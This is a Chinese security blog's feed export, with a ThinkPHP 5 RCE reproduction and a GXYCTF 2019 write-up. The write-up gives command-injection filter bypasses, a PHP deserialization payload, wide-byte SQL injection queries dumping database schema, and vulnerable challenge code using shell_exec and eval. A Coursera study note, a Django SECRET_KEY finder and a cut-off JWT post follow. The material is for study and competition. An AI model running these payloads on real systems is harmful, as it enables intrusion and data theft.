        <content type="html"><![CDATA[<h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p><p>–来自thinkphp官网</p></blockquote><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p><p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p><p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p><pre><code class="php">    public function exec()    {        // 监听module_init        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);        try {            // 实例化控制器            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));            if ($instance instanceof Controller) {                $instance-&gt;registerMiddleware();            }        } catch (ClassNotFoundException $e) {            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());        }    ...    }</code></pre><p>跟进controller</p><pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)    {        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);        if (class_exists($class)) {            return $this-&gt;__get($class);        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {            return $this-&gt;__get($emptyClass);        }        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);    }</code></pre><p>再跟进parseModuleAndClass</p><pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)    {        if (false !== strpos($name, &#39;\\&#39;)) {            $class  = $name;//存在\            $module = $this-&gt;request-&gt;module();        } else {            if (strpos($name, &#39;/&#39;)) {                list($module, $name) = explode(&#39;/&#39;, $name, 2);            } else {                $module = $this-&gt;request-&gt;module();            }            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);        }        return [$module, $class];    }</code></pre><p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p><p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p><p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p><p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/01/28/tp5rce复现/">https://explorersss.github.io/2020/01/28/tp5rce复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>coursera-杜克大学 程序设计与 Web 入门</title>
      <link href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/"/>
      <url>/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="coursera-杜克大学-程序设计与-Web-入门"><a href="#coursera-杜克大学-程序设计与-Web-入门" class="headerlink" title="coursera-杜克大学 程序设计与 Web 入门"></a>coursera-杜克大学 程序设计与 Web 入门</h1><h2 id="在coursera上学习的感受"><a href="#在coursera上学习的感受" class="headerlink" title="在coursera上学习的感受"></a>在coursera上学习的感受</h2><p>我觉得最大的优点是:教学和练习同时进行,极大的帮助了我快速掌握知识,这是我最喜欢的一点.但是对于中国境内的视频 加载有点难受,不过可以通过修改hosts来改善.</p><p>虽然这种教学方式我很喜欢,但是由于我的课程选择不太适合我自己(太基础了),导致我其实没学到啥,但是我还是硬着头皮看完了(闲得无聊?),选择适合自己的课程真的特别重要</p><h2 id="提问问题的注意事项"><a href="#提问问题的注意事项" class="headerlink" title="提问问题的注意事项"></a>提问问题的注意事项</h2><p><strong>详细</strong>,<strong>清楚</strong>的描述自己遇到的问题,及自己尝试解决问题的结果</p><h2 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h2><pre><code class="css">.classname{    preperty:value;}#ID{    preperty:value;}tagname {    preperty:value;};ortag1 tag2 {    preperty:value;};这个会修改tag1下的tag2</code></pre><h2 id="css资料"><a href="#css资料" class="headerlink" title="css资料"></a>css资料</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p><h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p><p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p><p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p><h2 id="用编程解决问题的七步骤"><a href="#用编程解决问题的七步骤" class="headerlink" title="用编程解决问题的七步骤"></a>用编程解决问题的七步骤</h2><ol><li>Work example by hand.<br>清晰的认识要解决的问题,并手动尝试解决</li><li>Write down what you did.<br>写下自己解决问题的过程(只针对这个具体的例子),不要忽略我们理所当然的东西,计算机不会这么想,我们要尽可能的详细,精确的记录我们解决问题的步骤</li><li>Find patterns.<br>将过程抽象成解决这个问题的一般性步骤,注意重复的步骤(变为循环语句),注意判断(变为条件语句)</li><li>Check by hand.<br>用具体的例子来检验抽象的步骤是否能解决问题</li><li>Translate to code. </li><li>Run test cases. </li><li>Debug failed test cases.<br>一般可以把问题分为:步骤问题(如没考虑某些特殊情况)和将步骤转为程序时(如函数用错)的问题</li></ol><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p><p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);for(var pixel of img.values()){//pixel是img.values()的引用    pixel.setRed(255);    pixel.setGreen(255);    pixel.setBlue(0);}print(img);</code></pre><h3 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);var context = canvas.getContext(&#39;2d&#39;);#initcontext.clearRect(0, 0, canvas.width, canvas.height);#clear canvascontext.font = &quot;30px Arial&quot;;context.fillText(&quot;Hello World&quot;, 10, 50);#draw a textcontext.fillStyle = &quot;red&quot;;context.fillRect(10, 10, 150, 80);#draw rectangle</code></pre><h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><p>当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标</p><p>但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量</p><h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p><h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>onclick,onchage,oninput</p><h2 id="给自己的建议"><a href="#给自己的建议" class="headerlink" title="给自己的建议"></a>给自己的建议</h2><blockquote><p>合格的程序员不应该浪费很多时间用于程序调试,他们应该一开始就不要把故障引入.</p><p>—-迪杰斯特拉</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p><p>发现bug-&gt;明确目的(了解bug发生的原因及解决方法)-&gt;收集信息-&gt;(多次)提出猜想(where,why)(要具有可测试性)-&gt;验证-&gt;解决</p><h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/25/coursera-杜克大学">https://explorersss.github.io/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/](<a href="https://explorersss.github.io/2020/01/25/coursera-杜克大学">https://explorersss.github.io/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gxytf2019</title>
      <link href="/2019/12/22/gxyctf2019/"/>
      <url>/2019/12/22/gxyctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>过滤$,’ ‘,</p><p>未过滤符号:<code>!,#,$,%,(,.,+,-,:,;,=</code></p><p>过滤空格用$IFS来代替</p><p>过滤flag</p><p>用base64来绕过</p><p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p><pre><code class="php">    &lt;?php    if(isset($_GET[&#39;ip&#39;])){        $ip = $_GET[&#39;ip&#39;];        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);            die(&quot;fxck your symbol!&quot;);        }        else if(preg_match(&quot;/ /&quot;, $ip)){            die(&quot;fxck your space!&quot;);        }        else if(preg_match(&quot;/bash/&quot;, $ip)){            die(&quot;fxck your bash!&quot;);        }        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){            die(&quot;fxck your flag!&quot;);        }        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);        echo &quot;&lt;pre&gt;&quot;;        print_r($a);    }    ?&gt;</code></pre><p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>没做出来忽略他</strong></p><p>上传类型也太露骨了把:检测后缀还是上传类型?</p><p>Content-Type: image/jpeg,可以上传了</p><p>上传文件后无法访问404</p><p>上传文件所在文件夹和session有关</p><p>将session置空后报错</p><pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre><p>猜测随机生成一个值放到session里面</p><p>php版本5.6可以%00截断</p><p>后缀不能以ph结尾</p><h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote><p>PHP 在反序列化 string 时没有严格按照序列化格式 <code>s:x:&quot;x&quot;;</code>进行处理，没有对 <code>&quot;</code>后面的是否存在 <code>;</code> 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。</p></blockquote><pre><code class="php">&lt;?php class FileReader{    public $Filename;    public $start;    public $max_length;    function __construct(){        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;        $this-&gt;start = 12;        $this-&gt;max_length = 72;    }    function __wakeup(){        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;        $this-&gt;start = 10;        $this-&gt;max_length = 0;        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;    }    function __destruct(){        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);        if(preg_match(&quot;/\{|\}/&quot;, $data)){            die(&quot;you can&#39;t read flag!&quot;);        }        else{            echo $data;        }    }}if(isset($_GET[&#39;exp&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){        die(&quot;hack!&quot;);    }    $exp = $_REQUEST[&#39;exp&#39;];    $e = unserialize($exp);    echo $e-&gt;Filename;}else{    $exp = new FileReader();}?&gt;</code></pre><p>令属性数量与实际数量不同来绕过<code>__wakeup</code></p><p>利用16进制绕过flag的限制</p><p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>正则匹配的四<code>$_GET</code>,而传的参数是<code>$_REQUEST</code>,从而绕过</p><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select 设置自己的密码拿到flag</p><h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>和bytectf2019有点类似 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p><p><code>var_dump(scandir(chr(time())));</code></p><p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p><p>chr,random_bytes</p><p>翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp</p><p>最后的payload</p><p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p><h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p><code>readfile(session_id(session_start()))</code></p><p>然后<code>PHPSESSID=flag.php</code>读到flag</p><h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>提到中文,宽字节注入绕过引号</p><p>过滤select,union,where等</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p><p>回显密码</p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p><p>数据库:<code>information_schema,web_sqli</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p><p>表:<code>f14g,user</code></p><p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p><p>列:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p><p>读取flag,但是有长度限制</p><p>最后得到抖肩舞+flag</p><p>GXY{g0Od_job1im_so_vegetable}</p><h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>对phpsession注入报错</p><pre><code class="html">&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;</code></pre><pre><code>[21:19:28] 200 -   89B  - /home.php[21:19:29] 200 -  562B  - /index.php[21:19:35] 200 -  253B  - /upload.php[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzz一下发现没啥好注的</p><p>再结合扫到的东东,爆破得到密码password</p><p>文件上传没用?上传后没有任何提示</p><p>content-type改为jpeg,可以上传但是后缀是.txt</p><p>如果能控制后缀就可以文件包含了尝试文件名处%00截断无效</p><p>home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)</p><p>因为题目环境是5.6,尝试%00截断 [ x ]</p><p>这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行</p><p>这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传</p><p>代码审计发现phar反序列化可以命令执行</p><p>已被魔改</p><p>home.php</p><pre><code class="php">&lt;?phpecho &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_GET[&#39;file&#39;])){    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;hacker!&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;当前引用 &quot;.$file;        require $file;    }}else{    die(&quot;no permission!&quot;);}?&gt;</code></pre><p>upload.php</p><pre><code class="php">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    上传    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt;&lt;?phpclass Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){            $this-&gt;Filename = $_GET[&#39;name&#39;];        }        else{            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;        }        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;        $this-&gt;token = &quot;admin&quot;;    }    function upload($file){        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;        }        else{            if($file[&#39;size&#39;] &gt; 1024){                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;            }            else{                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;            }        }    }    function __toString(){        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    }    function __destruct(){        if($this-&gt;token != &quot;admin&quot;){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);        echo &quot;__destruct&quot;;    }}if(isset($_FILES[&#39;file&#39;])) {    $uploader = new Uploader();    $uploader-&gt;upload($_FILES[&quot;file&quot;]);    if(@file_get_contents($uploader)){        echo &quot;成功上传&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);    }}?&gt;</code></pre><h2 id="参考-其他人的wp"><a href="#参考-其他人的wp" class="headerlink" title="参考(其他人的wp)"></a>参考(其他人的wp)</h2><ol><li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li></ol><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/22/gxyctf2019/">https://explorersss.github.io/2019/12/22/gxyctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 线上赛 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django快速查找配置</title>
      <link href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p><p>看到p牛一句很容易,人就傻掉了</p><p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p><p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p><p>代码写的不太好,自己改改用吧////</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p><h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p><p>dir()和<code>__dict__</code>的区别</p><p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p><p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p><p>所以以后查看对象的所有属性一定要用dir()</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/21/django快速查找配置/">https://explorersss.github.io/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
            <tag> ctf </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt攻击方式</title>
      <link href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p><p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p><h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p><p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p><h3 id="header部分"><a href="#header部分" class="headerlink" 